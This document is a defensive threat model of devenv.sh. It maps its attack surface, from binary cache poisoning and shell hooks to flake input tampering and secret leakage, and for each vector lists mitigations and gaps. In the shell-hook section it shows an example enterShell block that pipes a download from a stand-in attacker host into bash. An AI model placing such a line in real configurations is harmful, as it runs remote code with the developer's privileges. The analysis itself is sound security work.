# Devenv.sh Security Attack Surface: Complete Threat Model

## Overview

This report maps the complete attack surface of a devenv.sh-managed development environment. Devenv is a Nix-based tool that generates reproducible developer environments from declarative configuration (`devenv.nix`). It layers on top of Nix flakes, nixpkgs, direnv, Cachix binary caches, and process-compose. Each of these layers introduces distinct trust boundaries and attack vectors.

The threat model is organized by attack vector. For each vector: the mechanism, prerequisites, impact, and existing mitigations are described.

---

## 1. Package Source Attacks: Malicious Nixpkgs Overlays and Typosquatting

### Attack Mechanism

Devenv environments declare packages via `packages = [ pkgs.foo ];` in `devenv.nix`. The `pkgs` set comes from a nixpkgs flake input. Three sub-vectors exist:

**1a. Malicious nixpkgs overlays.** If `devenv.nix` imports overlays from external flake inputs or local files, an attacker who controls an overlay source can replace any package definition. Overlays have unrestricted access to the entire package set -- they can override `openssl`, `coreutils`, or any other package with a trojanized version. The override propagates through all transitive dependencies.

**1b. Upstream nixpkgs compromise.** Approximately 139 people have direct commit access to the nixpkgs master branch. The master branch historically lacked mandatory CI gating or PR review requirements. A compromised committer account could inject malicious build instructions that Hydra would then build and push to cache.nixos.org.

**1c. Typosquatting.** Unlike npm/PyPI where anyone can publish packages, nixpkgs is a monorepo with reviewer-gated contributions. This makes traditional typosquatting (registering `requsets` next to `requests`) structurally impossible within nixpkgs itself. However, typosquatting is possible via external flake inputs -- if a `devenv.nix` references `github:someuser/nixpkgs-extras` for additional packages, an attacker could register `github:someuser/nixpkgs-extra` (no 's') and hope for typos in `flake.nix`.

### Prerequisites

- 1a: Attacker controls a repository referenced as an overlay source
- 1b: Compromised nixpkgs committer account or GitHub infrastructure
- 1c: Developer mistypes a flake input URL; no review of `flake.nix` changes

### Potential Impact

**Critical.** Full code execution as the developer user. Trojanized packages run with the same privileges as the developer. Build-time compromise can exfiltrate secrets, install backdoors, or modify source code.

### Existing Mitigations

- Nixpkgs monorepo structure prevents open-registration typosquatting
- `flake.lock` pins inputs to exact commit hashes -- drift requires explicit `nix flake update`
- Code review norms (though not enforced by branch protection) for nixpkgs PRs
- Binary cache signatures verify that cached outputs match what the trusted builder produced

### Gaps

- No branch protection enforcement on nixpkgs master
- Overlay sources have no standardized trust verification
- No tooling to audit what overlays modify or which packages they touch

---

## 2. Binary Cache Poisoning

### Attack Mechanism

Devenv uses binary caches to avoid rebuilding packages from source. By default, two caches are configured:
- `cache.nixos.org` (official NixOS cache, Hydra-built)
- `devenv.cachix.org` (Cachix-hosted devenv cache)

Additional caches can be added via `cachix.pull = [ "mycache" ]` in `devenv.nix`.

**2a. Cache key compromise.** Binary cache signatures use a single keypair. If the signing key for `cache.nixos.org` is compromised, an attacker can sign arbitrary binaries and serve them as substitutes. Every user trusting that key would accept the malicious binaries.

**2b. Substituter misconfiguration.** If `require-sigs = false` is set in `nix.conf`, Nix accepts unsigned binaries from any configured cache. HTTP (non-TLS) cache URLs allow MITM attacks.

**2c. Provenance gap.** Binary cache signatures cover the store path, NAR hash, and references, but **do not cover the `Deriver:` field**. Multiple derivations can produce identical store paths (especially with fixed-output derivations). There is no cryptographic proof that a cached output was built from the claimed derivation. An attacker controlling a cache could serve outputs built from malicious sources that happen to produce the same hash.

**2d. Third-party cache trust.** Adding `cachix.pull = [ "someones-cache" ]` in `devenv.nix` trusts that cache operator completely. Any package they have built and signed will be accepted without source verification.

### Prerequisites

- 2a: Compromised cache signing key (high difficulty for cache.nixos.org)
- 2b: Misconfigured nix.conf (user error or malicious configuration)
- 2c: Attacker controls a trusted cache and can serve alternative build outputs
- 2d: Developer adds untrusted third-party cache

### Potential Impact

**Critical.** Arbitrary binary substitution means arbitrary code execution. The malicious binary runs with full user privileges.

### Existing Mitigations

- `require-sigs = true` is the default -- unsigned substitutions are rejected
- `trusted-public-keys` whitelist controls which signing keys are accepted
- HTTPS transport prevents MITM on cache downloads
- Nix can build everything from source by removing all substituters
- Trustix provides M-of-N distributed verification across multiple independent builders (experimental)

### Gaps

- Single-key trust model -- no key rotation, revocation, or multi-party signing for cache.nixos.org
- Deriver field not signed -- provenance tracking is weak
- No per-package trust policy (all-or-nothing per cache)
- Trustix requires reproducible builds, which not all nixpkgs packages achieve
- `devenv.cachix.org` is automatically trusted -- users cannot easily audit what it serves vs. what cache.nixos.org serves

---

## 3. Shell Hook Injection

### Attack Mechanism

Devenv provides multiple mechanisms for arbitrary code execution on shell entry:

**3a. `enterShell`.** Code in `enterShell` runs every time a developer enters the devenv shell. This is arbitrary bash executed with the user's full privileges, outside any sandbox. A malicious `devenv.nix` can use `enterShell` to exfiltrate credentials, modify files, install backdoors, or phone home.

```nix
enterShell = ''
  curl -s https://evil.com/payload | bash
'';
```

**3b. `scripts.*`.** Named scripts defined in `devenv.nix` become available as commands in the shell. They execute with full user privileges. A malicious script could masquerade as a legitimate development tool name (e.g., `scripts.npm.exec` overriding the real npm).

**3c. Git hooks via `git-hooks.hooks`.** Devenv automatically installs pre-commit hooks at `.git/hooks/pre-commit` when entering the shell. These hooks run arbitrary code on every `git commit`. A malicious hook configuration could exfiltrate staged changes, inject code into committed files, or run arbitrary commands. Custom hooks accept an `entry` field that is an arbitrary command.

**3d. Re-evaluation loop amplification.** As documented in GitHub issue #2497, `enterShell` tasks that modify git-tracked files can trigger exponential process growth (fork bomb). The loop: enterShell modifies file -> dirty tree hash changes -> direnv re-evaluates -> enterShell fires again. This is a denial-of-service vector that can crash developer machines.

### Prerequisites

- Attacker must get malicious `devenv.nix` into a repository the developer clones/pulls
- Developer must enter the devenv shell (automatic with direnv, requires `direnv allow`)
- For git hooks: developer must make a commit after entering the shell

### Potential Impact

**Critical.** Arbitrary code execution as the developer user. `enterShell` runs before the developer does any work -- it is the earliest possible code execution point after shell activation.

### Existing Mitigations

- `direnv allow` requires explicit approval before `.envrc` executes (but see vector 5)
- `devenv.nix` is typically version-controlled and code-reviewed
- `git commit --no-verify` bypasses pre-commit hooks (but doesn't protect against enterShell)

### Gaps

- No sandboxing of `enterShell` or `scripts.*` -- they run with full user privileges
- No mechanism to restrict what `enterShell` can do (no capability model)
- Pre-commit hooks can be silently installed/modified by changing `devenv.nix`
- Fork bomb via re-evaluation loop has no built-in recursion guard (workarounds are manual)

---

## 4. Plugin/Module System Trust Boundaries

### Attack Mechanism

Devenv uses the NixOS module system for composability. Modules can be imported from:
- Local files: `imports = [ ./modules/custom.nix ];`
- External flake inputs: `imports = [ inputs.some-devenv-module.devenvModules.default ];`

Modules have **unrestricted access to the entire configuration**. A module can:
- Override any other module's settings
- Add packages, scripts, enterShell code, services, and git hooks
- Modify environment variables
- Add additional flake inputs or binary caches

There is no capability-based access control. A module imported for "postgres support" can silently add enterShell code, modify PATH, or inject additional packages.

**Nix evaluation is not sandboxed.** When `devenv.nix` is evaluated (to produce the shell environment), all Nix code runs with the calling user's privileges. A malicious module can use `builtins.readFile` to read arbitrary files, `builtins.fetchurl` to exfiltrate data (if allowed-uris permits), or `builtins.exec` (if `allow-unsafe-native-code-during-evaluation` is enabled, which it is not by default).

### Prerequisites

- Developer imports a module from an untrusted source
- The module source is compromised (repository takeover, maintainer goes rogue)

### Potential Impact

**Critical.** Modules can do everything `devenv.nix` itself can do. There is no privilege separation between modules.

### Existing Mitigations

- `builtins.exec` is disabled by default (requires `allow-unsafe-native-code-during-evaluation`)
- `builtins.fetchurl` is restricted by `allowed-uris` in pure evaluation mode (flakes enable pure eval by default)
- Flake inputs are pinned in `flake.lock`
- Module source code is inspectable in the Nix store

### Gaps

- No module sandboxing or capability model
- No visibility into what a module modifies without reading its full source
- `builtins.readFile` can read any file the evaluating user can read (not restricted by pure eval)
- No standard trust/audit framework for devenv community modules

---

## 5. Direnv Integration Risks

### Attack Mechanism

Devenv integrates with direnv for automatic shell activation. The `.envrc` file contains:

```bash
eval "$(devenv direnvrc)"
use devenv
```

**5a. `.envrc` auto-loading after `direnv allow`.** Once a developer runs `direnv allow` on a repository, direnv loads `.envrc` automatically on every `cd` into that directory. Any subsequent change to `.envrc` by a collaborator or attacker requires re-approval. However, changes to `devenv.nix` (which `.envrc` invokes) do NOT require re-approval -- only `.envrc` itself is hash-checked.

**5b. TOCTOU attack.** On systems with multi-user access, an attacker can modify `.envrc` between the moment a developer inspects it and runs `direnv allow`. Direnv does not verify file permissions -- it allows `.envrc` files writable by other users.

**5c. Native auto-activation bypass.** Devenv 1.4+ supports native auto-activation without direnv, using `devenv allow`/`devenv revoke`. This is a separate trust mechanism from direnv's allow model. If both are configured, there are two independent approval chains to audit.

**5d. Transparent re-evaluation.** When `devenv.nix` changes (e.g., after `git pull`), direnv automatically re-evaluates the environment. This means a malicious change to `devenv.nix` pushed to a shared branch takes effect the next time any developer's shell prompt renders -- with no explicit approval step beyond the original `direnv allow`.

### Prerequisites

- 5a: Attacker can push changes to `devenv.nix` in a repository the developer has already allowed
- 5b: Attacker has write access to the `.envrc` file on the filesystem
- 5d: Attacker can modify `devenv.nix` in a shared repository

### Potential Impact

**High.** Arbitrary code execution via `enterShell`, scripts, or modified packages. The attack is silent -- the developer may not notice `devenv.nix` changed.

### Existing Mitigations

- `direnv allow` gates initial `.envrc` execution
- `.envrc` content is hash-checked; modifications require re-approval
- Version control + code review for `devenv.nix` changes
- `devenv allow`/`revoke` provides a second approval layer for native activation

### Gaps

- Changes to `devenv.nix` bypass direnv's approval (only `.envrc` is hash-checked)
- No diff display or review prompt when `devenv.nix` changes trigger re-evaluation
- TOCTOU window exists on multi-user systems
- Developers may `direnv allow` without carefully reviewing `.envrc` content

---

## 6. Build-Time Code Execution (Pre/Post-Install Hooks)

### Attack Mechanism

Unlike npm/pip, Nix packages do **not** have traditional "install scripts" that run arbitrary code in the user's environment at install time. Instead, all build logic runs inside the Nix build sandbox.

**6a. Builder scripts in derivations.** Each Nix derivation has a `builder` (typically a bash script) that runs during `nix-build`. This builder executes within the sandbox: no network access (for non-FOD derivations), no access to the host filesystem beyond the Nix store, isolated PID/mount/network/IPC/UTS namespaces on Linux.

**6b. Fixed-output derivation escape.** Fixed-output derivations (FODs) -- used for `fetchurl`, `fetchgit`, etc. -- have **full network access** because they need to download content. The output is verified by hash after download. However, a malicious FOD could phone home, exfiltrate build environment data, or download different content depending on the target (the hash check prevents the wrong content from being used, but the network access itself is the risk).

**6c. Setup hooks and propagated dependencies.** Nixpkgs uses "setup hooks" (`setupHook` attribute) that run as part of the build environment for any package that depends on them. A malicious package could include a setup hook that modifies the build environment of its dependents. This runs inside the sandbox but can affect build outputs.

**6d. Post-build hooks.** `nix.conf` supports `post-build-hook` which runs after each build completes. This runs as the Nix daemon user (often root), outside the sandbox. If an attacker can modify nix.conf (requires root or trusted-user access), they can execute arbitrary code after every build.

### Prerequisites

- 6a: Attacker must get malicious build code into a derivation (via nixpkgs commit or overlay)
- 6b: Malicious FOD must be evaluated (part of the dependency tree)
- 6c: Malicious package must be a dependency (direct or transitive)
- 6d: Attacker must be able to modify nix.conf (root access)

### Potential Impact

- 6a: **Low** (sandboxed, no persistent access)
- 6b: **Medium** (network exfiltration possible, but output hash-verified)
- 6c: **Medium** (can affect build outputs of dependents, but within sandbox)
- 6d: **Critical** (arbitrary code as root, outside sandbox)

### Existing Mitigations

- Build sandbox enabled by default on NixOS (private namespaces, no network for non-FOD)
- FOD outputs are hash-verified -- wrong content is rejected
- `sandbox = true` in nix.conf enforces sandboxing (trusted users can override)
- Build users provide UID separation from the invoking user

### Gaps

- FOD network access is unrestricted (can phone home even if output is hash-verified)
- Sandbox is about reproducibility, not security -- trusted users can disable it
- Setup hooks have no visibility/audit mechanism
- `sandbox = relaxed` mode allows `__noChroot = true` derivations to skip sandboxing entirely

---

## 7. Flake Input Manipulation

### Attack Mechanism

**7a. Lock file tampering.** `flake.lock` pins every input to a specific git revision and NAR hash. If an attacker can modify `flake.lock` (via a malicious PR or compromised CI), they can redirect inputs to attacker-controlled commits. The lock file is JSON -- changes can be subtle and hard to spot in code review.

**7b. `follows`-based input substitution.** The `follows` mechanism allows a consumer flake to override a dependency's transitive inputs. For example: `inputs.some-tool.inputs.nixpkgs.follows = "nixpkgs"`. This is normally used for deduplication. But if an attacker controls a flake that uses `follows` to redirect its dependencies, the consuming flake may unknowingly use different (potentially malicious) transitive inputs than expected.

**7c. Registry attacks.** Nix flake registries map short names (like `nixpkgs`) to URLs. The global registry at `flake-registry.json` (hosted on GitHub) is the default. If an attacker compromises this registry, they can redirect `nixpkgs` to a malicious fork. Locally, registry entries in `~/.config/nix/registry.json` take precedence.

**7d. Unpinned/floating inputs.** If a `flake.nix` references `github:NixOS/nixpkgs/nixos-unstable` and `flake.lock` is not committed to version control (or CI runs `nix flake update` automatically), every evaluation may get a different nixpkgs revision. An attacker who briefly compromises the upstream branch can inject malicious code that is consumed by downstream builds during the window.

**7e. `--override-input` CLI attack.** The `nix` CLI supports `--override-input` which substitutes any flake input at evaluation time. If an attacker can influence CLI arguments (e.g., via a malicious Makefile, CI script, or shell alias), they can redirect inputs without touching `flake.nix` or `flake.lock`.

### Prerequisites

- 7a: Write access to repository (PR, compromised CI)
- 7b: Control of a transitive dependency flake
- 7c: Compromise of GitHub-hosted registry or local registry file
- 7d: `flake.lock` not committed or auto-updated without review
- 7e: Ability to influence CLI arguments (Makefile, CI, shell alias)

### Potential Impact

**Critical.** Redirecting nixpkgs or any input gives full control over the package set, build toolchain, and all shell environment code.

### Existing Mitigations

- `flake.lock` pins inputs to exact commit hashes and NAR hashes
- Lock file changes are visible in version control diffs
- Determinate Systems' Flake Checker validates input sources, branch support, and currency
- Pure evaluation mode restricts `builtins.fetchurl` to `allowed-uris`

### Gaps

- Lock file diffs are tedious to review (long hashes, JSON format)
- No automated alerting when lock file inputs change unexpectedly
- `--override-input` can bypass lock file entirely
- Global registry is a single point of failure (though rarely used with flakes)
- `follows` chains can be deep and hard to audit

---

## 8. Environment Variable Leakage

### Attack Mechanism

**8a. Secrets in `devenv.nix` configuration.** Developers may embed API keys, tokens, or credentials directly in `devenv.nix` as environment variables (`env.API_KEY = "sk_live_..."`). These values become part of the Nix store path, which is world-readable (`dr-xr-xr-x` permissions). Any user on the system can read them. They persist in the Nix store indefinitely.

**8b. `env-vars` file exposure.** Nix creates an `env-vars` file during builds to aid debugging. A historical vulnerability (patched in NixOS 24.05) made this file world-readable (`0644`), exposing all build-time environment variables to any system user. Now patched to `0600`.

**8c. `impureEnvVars` leakage.** Fixed-output derivations can access host environment variables via `impureEnvVars`. If a developer's shell contains sensitive variables (AWS keys, API tokens) and a FOD declares `impureEnvVars = [ "AWS_SECRET_ACCESS_KEY" ]`, those secrets flow into the build sandbox -- and into the build log.

**8d. `.env` file loading.** Devenv supports loading `.env` files via `dotenv.enable = true`. These files often contain secrets. If `.env` is committed to version control or visible in the Nix store, secrets are exposed.

**8e. `devenv.local.nix` secrets.** Configuration in `devenv.local.nix` is not committed to version control (by convention), but it is still evaluated as Nix code and its values may end up in the Nix store.

### Prerequisites

- 8a: Developer puts secrets in `devenv.nix` or `env.*` settings
- 8b: Unpatched Nix version + multi-user system
- 8c: Malicious FOD + sensitive env vars in developer's shell
- 8d: `.env` committed or Nix-store-visible

### Potential Impact

- 8a: **High** (credential theft by any local user; persistent exposure)
- 8b: **Medium** (patched; only affects unpatched systems)
- 8c: **Medium** (requires malicious FOD in dependency tree)
- 8d: **High** (credential exposure if `.env` mishandled)

### Existing Mitigations

- SecretSpec (`secretspec.enable = true`) provides runtime secret injection, avoiding build-time exposure
- `devenv.local.nix` is .gitignored by convention
- `env-vars` file permissions patched to `0600`
- sops-nix provides encrypted secret management for NixOS

### Gaps

- No warning when secrets are embedded in `devenv.nix` environment variables
- Nix store is world-readable by design -- any value that ends up there is exposed
- No mechanism to mark environment variables as sensitive and prevent them from appearing in build logs
- `.env` files have no encryption-at-rest

---

## 9. Process/Service Management Isolation

### Attack Mechanism

`devenv up` starts background services (PostgreSQL, Redis, etc.) using the configured process manager (native, process-compose, overmind, etc.).

**9a. No process isolation.** Services run as the developer user with no sandboxing, containerization, or namespace isolation. A compromised service has full access to the developer's files, network, and credentials. Unlike systemd services, there is no `PrivateNetwork`, `ProtectHome`, or capability dropping.

**9b. Network exposure.** Services bind to localhost ports by default, but there is no firewall enforcement. If the developer's machine is on a shared network, services may be accessible to other machines (depending on host firewall configuration).

**9c. Port manipulation.** Devenv's automatic port allocation tries sequential ports when the default is taken. If an attacker starts a malicious service on the expected port before `devenv up`, the legitimate service shifts to a different port while the attacker's service captures traffic intended for the legitimate one.

**9d. Linux capabilities.** Devenv supports `processes.<name>.linux.capabilities` which can grant elevated privileges to processes. Misconfiguration could grant `CAP_NET_RAW`, `CAP_SYS_ADMIN`, or other dangerous capabilities.

### Prerequisites

- 9a: Compromised package or service configuration in `devenv.nix`
- 9b: Developer on shared network without host firewall
- 9c: Attacker has local process execution on the developer's machine
- 9d: Misconfigured capability grants in `devenv.nix`

### Potential Impact

- 9a: **High** (lateral movement from compromised service to developer files)
- 9b: **Medium** (service exposure to network, depends on host firewall)
- 9c: **Medium** (traffic interception)
- 9d: **High** (privilege escalation via capability abuse)

### Existing Mitigations

- Services bind to localhost by default
- Process manager supports health checks that could detect tampering
- `strict_ports: true` mode fails instead of auto-allocating (prevents port-shifting attacks)
- Watchdog monitoring can detect hung/compromised processes

### Gaps

- No namespace isolation, cgroup limits, or seccomp filters for managed services
- No equivalent of systemd's service hardening options
- No file/network access restrictions on running services
- Capability configuration is powerful but has no guardrails

---

## 10. Supply Chain Through Devenv Itself

### Attack Mechanism

**10a. Installation vector.** Devenv is installed via `nix profile install nixpkgs#devenv` or `nix-env -iA devenv`. It comes from nixpkgs (trusting the nixpkgs supply chain) or from Cachix (trusting the Cachix binary cache). The installation itself does not involve `curl | sh` -- it goes through Nix's normal package/substitution infrastructure. However, Nix itself is often installed via `curl | sh` (`sh <(curl -L https://nixos.org/nix/install) --daemon`), which trusts nixos.org's web infrastructure.

**10b. Devenv's own flake input.** Devenv's `direnvrc` script is fetched from GitHub with SHA256 verification: `source_url "https://raw.githubusercontent.com/.../direnvrc" "sha256-..."`. This provides integrity verification but trusts GitHub's infrastructure for availability.

**10c. Devenv's bundled nixpkgs.** Devenv pins its own nixpkgs input (`devenv-nixpkgs/rolling`) separate from the user's nixpkgs. This means devenv's tooling and the user's packages may come from different nixpkgs revisions with different trust properties. The devenv.cachix.org cache serves binaries for devenv's internal nixpkgs.

**10d. Auto-update risks.** If devenv or its flake inputs are updated without review (`nix profile upgrade`, `nix flake update`), a compromised upstream can push malicious updates that take effect immediately.

### Prerequisites

- 10a: Compromise of nixpkgs, cache.nixos.org, or nixos.org web infrastructure
- 10b: Compromise of cachix/devenv GitHub repository
- 10c: Compromise of devenv-nixpkgs repository or devenv.cachix.org
- 10d: Unreviewed auto-updates

### Potential Impact

**Critical.** Devenv itself is a trusted component that generates the entire development environment. Compromising devenv means compromising every project that uses it.

### Existing Mitigations

- Devenv is an open-source nixpkgs package with community review
- Installation through Nix provides hash verification of all store paths
- `flake.lock` pins devenv's own inputs
- `direnvrc` SHA256 verification prevents tampered script execution

### Gaps

- `curl | sh` for Nix installation is an industry-standard but fundamentally trust-on-first-use pattern
- devenv.cachix.org is a Cachix-hosted cache with a single signing key -- no multi-party verification
- No transparency log for devenv releases
- Auto-update paths can bypass review

---

## Cross-Cutting Concerns

### Nix Evaluation Is Not Sandboxed

The single most important architectural fact for this threat model: **Nix evaluation (interpreting `.nix` files) runs unsandboxed with the calling user's full privileges.** The Nix build sandbox only applies to the build phase (running the builder script). Everything that happens during evaluation -- importing modules, reading files, computing derivation attributes -- runs as the user.

This means:
- `builtins.readFile "/etc/passwd"` works during evaluation
- Arbitrary Nix code in `devenv.nix`, imported modules, or flake inputs executes at evaluation time
- `builtins.fetchurl` can make network requests (restricted by `allowed-uris` in pure eval mode, but pure eval can be disabled)

### Trusted Users Are Effectively Root

The `trusted-users` setting in `nix.conf` grants users the ability to set any Nix daemon configuration, including `sandbox = false`. Trusted users should be treated as equivalent to root on the Nix daemon. On NixOS, `trusted-users` defaults to `root` only, but multi-user setups or CI environments may add additional users.

### The "Review `devenv.nix`" Bottleneck

Most attack vectors converge on a single control point: code review of `devenv.nix` and its dependencies. If a malicious change to `devenv.nix`, an imported module, or a flake input passes code review (or bypasses it), nearly all described attacks become possible. Unlike npm where a malicious package might be sandboxed by the OS, a malicious `devenv.nix` runs with the developer's full privileges at evaluation time.

---

## Threat Summary Matrix

| # | Vector | Severity | Prerequisites | Nix Mitigates? |
|---|--------|----------|---------------|----------------|
| 1a | Malicious overlay | Critical | Control overlay source repo | No |
| 1b | Nixpkgs compromise | Critical | Compromised committer | Partially (review norms) |
| 1c | Flake input typosquatting | High | Developer typo | No (no registry) |
| 2a | Cache key compromise | Critical | Compromised signing key | No (single key) |
| 2b | Substituter misconfiguration | Critical | Disabled require-sigs | Yes (default on) |
| 2c | Cache provenance gap | Medium | Control trusted cache | No (Deriver unsigned) |
| 2d | Third-party cache trust | High | Developer adds cache | No (all-or-nothing) |
| 3a | enterShell injection | Critical | Malicious devenv.nix | No (unsandboxed) |
| 3b | Script masquerading | High | Malicious devenv.nix | No |
| 3c | Git hook injection | High | Malicious devenv.nix | No |
| 3d | Re-evaluation fork bomb | Medium | enterShell modifies files | No (no guard) |
| 4 | Malicious module | Critical | Import untrusted module | Partially (pure eval) |
| 5a | devenv.nix change bypass | High | Push to shared repo | No |
| 5b | TOCTOU on .envrc | Medium | Multi-user filesystem | No |
| 5d | Silent re-evaluation | High | Push to shared repo | No |
| 6b | FOD network access | Medium | Malicious FOD in deps | No (by design) |
| 6d | Post-build hook | Critical | Root access | No |
| 7a | Lock file tampering | Critical | Write access to repo | Partially (diffable) |
| 7d | Floating inputs | High | Auto-update without review | Partially (lock file) |
| 7e | --override-input | High | Control CLI args | No |
| 8a | Secrets in store | High | Developer error | No (store world-readable) |
| 9a | Service no isolation | High | Compromised service | No |
| 10a | Devenv supply chain | Critical | Compromise upstream | Partially (hash verified) |

---

## Key Architectural Observations

1. **The sandbox protects builds, not developers.** The Nix build sandbox is designed for reproducibility, not security. It prevents builds from accessing unexpected inputs, but trusted users can disable it, FODs bypass network isolation, and the entire evaluation phase is unsandboxed.

2. **Devenv's trust model is "trust on first allow."** Once `direnv allow` is run, all subsequent changes to `devenv.nix` execute without further approval. The `.envrc` hash-check is a coarse gate, not a per-change review mechanism.

3. **Everything converges on code review.** The primary defense against most vectors is reviewing changes to `devenv.nix`, `flake.nix`, `flake.lock`, and imported modules. There is no defense-in-depth -- if review fails, exploitation is straightforward.

4. **No runtime isolation for the development environment.** Unlike containers or VMs, devenv environments run with the developer's full privileges. There is no filesystem isolation, no network restriction, no capability dropping for the shell or its processes.

5. **Binary cache trust is brittle.** The single-key signing model with all-or-nothing cache trust provides weaker guarantees than many users assume. Trustix offers a better model but requires reproducible builds.
